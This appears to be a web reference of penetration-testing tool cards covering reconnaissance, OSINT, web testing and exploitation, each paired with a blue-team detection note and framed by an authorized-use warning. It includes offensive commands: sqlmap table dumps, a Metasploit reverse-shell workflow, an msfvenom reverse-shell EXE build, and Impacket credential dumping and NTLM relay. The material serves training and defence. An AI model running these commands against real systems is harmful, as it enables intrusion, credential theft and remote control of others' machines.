⚠️ Rules of Engagement — Read This First Ethics ▶
Authorized Use Only
These Tools Are for Permission-Based Testing
Every tool in this domain is a reference for authorized penetration testing, CTF competitions, home-lab practice, and cert prep (PenTest+, OSCP, CEH). Running them against systems you don't own or lack written permission to test is illegal in most jurisdictions (CFAA, Computer Misuse Act, etc.). Always work inside a signed scope / rules of engagement, stay within the authorized targets and time window, and handle any data you touch responsibly. Each card pairs offense with a blue-team detection note — because knowing how an attack looks on the wire is what makes you good at both sides.
🗺️ Nmap — The Network Mapper (Deep Dive) Recon ▶
Reference
The Swiss-Army Knife of Discovery
Nmap is the default tool for host discovery, port scanning, service/version detection, and OS fingerprinting. Its scripting engine (NSE) extends it into vuln checks and light exploitation. Authorized targets only.
▸ SCAN TYPES & ESSENTIALS
nmap -sS 10.0.0.0/24        # SYN "half-open" scan (default, fast, needs root)
nmap -sT target             # full TCP connect (no root)
nmap -sU target             # UDP scan (slow; DNS/SNMP/DHCP live here)
nmap -sV -O target          # service versions + OS detection
nmap -p- target             # all 65535 ports (default scans top 1000)
nmap -sC -sV -oA scan target # default scripts + versions, save all formats
nmap -T4 -Pn target          # faster timing; skip host-discovery ping
▸ NSE (SCRIPTING ENGINE)
FlagDoes
-sCRun the default safe script set
--script vulnKnown-vuln checks
--script smb-enum-sharesCategory/named scripts (~600 available)
-AAggressive: -sV -O -sC + traceroute
Blue-team note: a SYN scan shows up as many connections with no completed handshake from one source — IDS (Suricata/Zeek) and firewall logs flag the fan-out. -T4/-T5 timing is loud; real adversaries scan slow.
⚡ Masscan & RustScan — Internet-Scale Port Discovery Recon ▶
Reference
When Nmap Is Too Slow
Masscan is an asynchronous scanner that can probe the entire IPv4 space in minutes by sending packets without waiting for replies. RustScan finds open ports fast, then hands them to Nmap for deep inspection — best of both. Authorized scope and rate limits only; unbounded scanning is disruptive. 
# Masscan — set a sane rate (packets/sec); high rates can DoS the target
masscan 10.0.0.0/16 -p1-65535 --rate 1000 -oL out.txt

# RustScan → auto-pipe discovered ports into nmap -sV -sC
rustscan -a target --range 1-65535 -- -sV -sC
Blue-team note: extremely high packet rates from a single IP to sequential ports are the signature — netflow/IDS thresholds catch it instantly. Attackers throttle to blend in.
🌾 theHarvester & Recon-ng — OSINT Frameworks OSINT ▶
Reference
Passive Intelligence Before You Touch the Target
theHarvester gathers emails, subdomains, hosts, and names from public sources (search engines, certificate transparency, PGP keyservers). Recon-ng is a full framework with a Metasploit-style module system for structured OSINT into a local database. These are passive — they query third parties, not the target directly. 
theHarvester -d example.com -b all      # emails/subdomains from all sources

# Recon-ng — modular, DB-backed
recon-ng
[recon-ng] > marketplace install all
[recon-ng] > modules load recon/domains-hosts/hackertarget
[recon-ng] > options set SOURCE example.com
[recon-ng] > run
Blue-team note: passive OSINT is nearly invisible to the target — the defense is reducing your footprint: scrub metadata, limit what's public, monitor certificate-transparency logs for look-alike domains.
🔭 Amass & Subfinder — Subdomain Enumeration OSINT ▶
Reference
Mapping the Full Attack Surface
Organizations expose far more subdomains than they realize — dev, staging, forgotten apps. Amass (OWASP) and Subfinder aggregate dozens of sources (cert transparency, DNS, APIs) to enumerate them. Finding the forgotten old-admin.example.com is often the way in. 
subfinder -d example.com -all -o subs.txt   # fast, passive
amass enum -passive -d example.com            # passive aggregation
amass enum -active -d example.com -brute       # active: resolves + brute-forces
Blue-team note: maintain your own asset inventory the same way — you can't defend subdomains you forgot you own. Watch for dangling DNS records (subdomain takeover risk).
🛰️ Shodan & Censys — Search Engines for Exposed Devices OSINT ▶
Reference
The Internet, Already Scanned for You
Shodan and Censys continuously scan the internet and index every exposed service — banners, ports, TLS certs, default logins, ICS/SCADA, webcams. Searching them is passive (you query their database, not the target), making them a favorite first step.
▸ SHODAN SEARCH FILTERS

Blue-team note: search Shodan/Censys for your own org regularly — it's the fastest external-exposure audit there is. Anything you find, an attacker already has.

Google Dorking uses advanced operators to surface exposed data indexed by search engines (the Google Hacking Database catalogs thousands of proven queries). Maltego and SpiderFoot automate OSINT into visual link graphs — connecting domains, emails, people, and infrastructure.

🧪 Burp Suite — The Web Pentest Workbench Web ▶
Reference
Intercept, Modify, Replay
Burp Suite is the industry-standard web app testing platform. It sits as a proxy between your browser and the target, letting you inspect and tamper with every request. Authorized targets only.
ToolDoes
ProxyIntercept + edit requests/responses on the fly
RepeaterManually tweak & resend a single request (the core manual-testing loop)
IntruderAutomate payloads over positions — fuzzing, brute force, enumeration
ScannerAutomated vuln crawl (Pro)
Decoder / ComparerEncode/decode & diff responses
Typical flow: browse the app through the proxy to map it → send an interesting request to Repeater → probe for injection/auth flaws by hand → automate with Intruder. Blue-team note: app-layer WAF + anomaly detection on parameter tampering and high request volume from one session.
⚡ OWASP ZAP — The Open-Source Web Scanner Web ▶
Reference
Burp's Free Cousin — Great for CI
OWASP ZAP is a free, open-source web proxy/scanner with much of Burp's core: intercepting proxy, spider, active/passive scanning, and fuzzing. Its automation-friendliness makes it the go-to for DAST in CI/CD — run a baseline scan on every build against a staging deploy. 
# Baseline (passive) scan — safe for CI, no attacks
zap-baseline.py -t https://staging.example.com

# Full active scan (authorized targets only)
zap-full-scan.py -t https://staging.example.com
Blue-team crossover: because ZAP is a defensive tool too, wire it into your own pipeline to catch OWASP Top 10 regressions before release.
💉 sqlmap — Automated SQL Injection Web ▶
Reference
Detect & Exploit SQLi, End to End
sqlmap automates finding and exploiting SQL injection — from detection through data extraction, and even OS shell where the DB permits. Powerful and noisy; authorized scope only. 
sqlmap -u "https://site/item?id=1" --batch    # test a parameter
sqlmap -r request.txt --level 3 --risk 2   # from a saved Burp request
sqlmap -u "..." --dbs                     # list databases
sqlmap -u "..." -D shop -T users --dump    # dump a table
FlagMeaning
--level / --riskHow hard/aggressive to test (1–5 / 1–3)
--tamperEvasion scripts (encode payloads past filters/WAF)
--batchNon-interactive (accept defaults)
Blue-team note: the fix is parameterized queries, not a WAF — but a WAF + DB query logging will scream at sqlmap's payload patterns and error-based probing.
📁 ffuf & Gobuster — Content & Parameter Fuzzing Web ▶
Reference
Finding the Hidden Endpoints
Web apps hide directories, files, vhosts, and parameters that aren't linked anywhere. ffuf (fast, Go) and Gobuster brute-force them from a wordlist — finding /admin, /backup.zip, or an undocumented API parameter. Authorized scope only. 
# Directory discovery — FUZZ marks the injection point
ffuf -u https://site/FUZZ -w wordlist.txt

# Filter noise by response size / status
ffuf -u https://site/FUZZ -w list.txt -fc 404 -fs 0

# Virtual-host discovery
ffuf -u https://site -H "Host: FUZZ.site" -w vhosts.txt

# Gobuster equivalent
gobuster dir -u https://site -w wordlist.txt
Blue-team note: a flood of 404s to random paths from one source is the signature — rate-limit and alert on it. Common wordlists come from SecLists.
🎯 Nuclei — Templated Vulnerability Scanning Web ▶
Reference
Community-Powered Checks at Scale
Nuclei runs thousands of YAML-defined templates against targets to detect known CVEs, misconfigurations, exposed panels, and default creds — fast and low-false-positive. Dual-use: attackers find weak spots; defenders scan their own estate the same way. 
nuclei -u https://site                    # all default templates
nuclei -l hosts.txt -t cves/ -severity critical,high
nuclei -u https://site -t exposures/       # exposed configs/keys
Blue-team note: run Nuclei against your own external surface on a schedule — it's one of the fastest ways to catch a newly-disclosed CVE affecting you before an attacker does.
🔬 Nikto & WPScan — Server & CMS Scanning Web ▶
Reference
Quick Wins on Web Servers & WordPress
Nikto is a fast (loud) web-server scanner for known dangerous files, outdated software, and misconfigurations. WPScan targets WordPress specifically — enumerating plugins/themes/users and matching them to known vulns (WordPress powers ~40% of the web, so it's a huge attack surface). Authorized targets only. 
nikto -h https://site                       # server misconfig sweep
wpscan --url https://site --enumerate vp,u   # vuln plugins + users
Blue-team note: both are extremely noisy — trivially caught by IDS/WAF. Defense is patching, removing version banners, and keeping CMS plugins minimal and current.
🧨 Metasploit Framework — Modules, Sessions & Workflow Exploitation ▶
Reference
The Standard Exploitation Framework
Metasploit bundles thousands of exploits, payloads, and post-exploitation modules behind one workflow — the core tool for the exploitation phase and a PenTest+/OSCP staple. Authorized targets only; every module here is for permission-based testing.
▸ MODULE TYPES
TypeDoes
exploitDelivers a payload via a vulnerability
payloadCode that runs post-exploit (e.g. Meterpreter)
auxiliaryScanners, fuzzers, no payload
postPost-exploitation (loot, pivot, persist)
encoderObfuscate payloads past simple filters
▸ CONSOLE WORKFLOW
msfconsole
msf> search type:exploit smb
msf> use exploit/windows/smb/...
msf> show options
msf> set RHOSTS 10.0.0.5
msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf> set LHOST 10.0.0.1
msf> run                        # → opens a session on success
msf> sessions -i 1              # interact with session 1
Blue-team note: default Meterpreter and stock modules have well-known signatures — EDR and AV catch them readily. Detection maps directly to ATT&CK exploitation + C2 techniques.
📦 msfvenom — Payload Generation Exploitation ▶
Reference
Standalone Payloads in Any Format
msfvenom generates payloads outside the console — an executable, script, or shellcode you deliver during an authorized engagement (e.g. a reverse shell for a lab box you've been scoped to test). It pairs a payload with an output format and optional encoders. 
# Windows reverse-shell EXE (lab/authorized use)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe

# List payloads / formats
msfvenom --list payloads
msfvenom --list formats
FlagMeaning
-pPayload
-fOutput format (exe, elf, raw, python, …)
-e / -iEncoder & iterations (basic evasion)
Blue-team note: the LHOST/LPORT callback is the tell — outbound connections to an unusual host/port right after a file executes. Egress filtering + EDR behavioral rules catch it.
🗃️ Searchsploit & Exploit-DB — Finding Public Exploits Exploitation ▶
Reference
Match a Version to a Known Exploit
Once enumeration gives you exact software versions, the question is: is there a public exploit? Exploit-DB is the archive; searchsploit is its offline CLI (ships with Kali). Vet before you run — public PoCs can be broken, or booby-trapped. 
searchsploit apache 2.4          # find exploits for a version
searchsploit -x php/webapps/1234  # view the exploit source
searchsploit -m php/webapps/1234  # copy it locally to inspect/edit
Blue-team note: this is why version-hiding + fast patching matter — the entire chain is "know the version → look up the exploit." Remove version banners and keep software current.
🐍 Impacket — The Windows/AD Python Toolkit Exploitation ▶
Reference
Speak Windows Protocols From Linux
Impacket is a collection of Python scripts that implement Windows network protocols (SMB, Kerberos, MSRPC) — the backbone of hands-on Active Directory testing. It lets you move laterally, dump creds, and execute commands with credentials you've legitimately obtained during an engagement. Authorized AD environments only.
ScriptDoes
psexec.pyCommand execution over SMB (SYSTEM shell)
wmiexec.pyQuieter command exec via WMI
secretsdump.pyDump hashes (SAM, LSA, NTDS.dit)
GetUserSPNs.pyKerberoasting — request service tickets
ntlmrelayx.pyRelay captured NTLM auth to other hosts
Blue-team note: these leave clear Windows Event Log traces — service creation (7045) for psexec, ticket requests (4769) for Kerberoasting, unusual SMB auth patterns for relay. Sysmon + a SIEM rule per technique catches them.
